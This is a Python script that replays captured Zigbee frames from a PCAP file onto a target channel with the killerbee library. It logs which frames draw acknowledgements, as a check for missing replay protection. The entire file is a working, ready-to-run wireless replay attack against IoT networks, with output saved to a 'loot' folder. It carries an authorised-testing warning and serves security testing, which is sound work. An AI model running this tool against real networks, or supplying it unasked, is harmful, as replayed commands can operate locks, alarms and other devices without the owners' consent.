#!/usr/bin/env python3
"""
zigbee-replay-attack.py
Description : Replay captured Zigbee frames to test replay protection.
              Reads frames from a PCAP file and retransmits them on the
              target channel. Tests whether the network uses frame counters
              (APS counter / NWK counter) to reject replayed frames.
Requires    : killerbee, scapy
Usage       : python3 zigbee-replay-attack.py <channel> <pcap_file> [device]
WARNING     : Only use on networks you are authorised to test.
"""

import sys
import time
import os
from datetime import datetime

try:
    from killerbee import KillerBee
    from scapy.all import rdpcap
except ImportError:
    print("[!] killerbee and/or scapy not found.")
    print("    Install: pip install killerbee scapy")
    sys.exit(1)

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <channel> <pcap_file> [device]")
    sys.exit(1)

CHANNEL   = int(sys.argv[1])
PCAP_FILE = sys.argv[2]
DEVICE    = sys.argv[3] if len(sys.argv) > 3 else None

LOOT_DIR = f"./loot/zigbee-replay-{datetime.now().strftime('%Y%m%d_%H%M%S')}"
os.makedirs(LOOT_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOOT_DIR, "replay_results.txt")

print(f" ==================================================")
print(f"  Zigbee Replay Attack")
print(f"  Channel: {CHANNEL} | PCAP: {PCAP_FILE}")
print(f" ==================================================")
print("[!] WARNING: Authorised testing only")

try:
    packets = rdpcap(PCAP_FILE)
    raw_frames = [bytes(p) for p in packets if len(bytes(p)) >= 5]
    print(f"[*] Loaded {len(raw_frames)} frames from {PCAP_FILE}")
except Exception as e:
    print(f"[!] Could not read PCAP: {e}")
    sys.exit(1)

try:
    kb = KillerBee(device=DEVICE)
    kb.set_channel(CHANNEL)

    with open(LOG_FILE, 'w') as log:
        log.write(f"Frame,Length,Transmitted,Response\n")
        for i, frame in enumerate(raw_frames):
            print(f"[*] Replaying frame {i+1}/{len(raw_frames)} ({len(frame)} bytes)...")
            try:
                kb.inject(frame)
                time.sleep(0.1)
                # Check for ACK or reject
                resp = kb.pnext(timeout=0.3)
                status = "ACK_RCVD" if resp and resp[1] else "NO_RESPONSE"
                log.write(f"{i+1},{len(frame)},OK,{status}\n")
                print(f"    → {status}")
            except Exception as e:
                log.write(f"{i+1},{len(frame)},FAIL,{str(e)[:50]}\n")
                print(f"    → TX FAILED: {e}")
            time.sleep(0.05)

    print(f"\n[+] Replay complete. Results: {LOG_FILE}")
    print("    Responses = replay protection ABSENT or weak counter check")

except Exception as e:
    print(f"[!] Error: {e}")
finally:
    try:
        kb.close()
    except Exception:
        pass
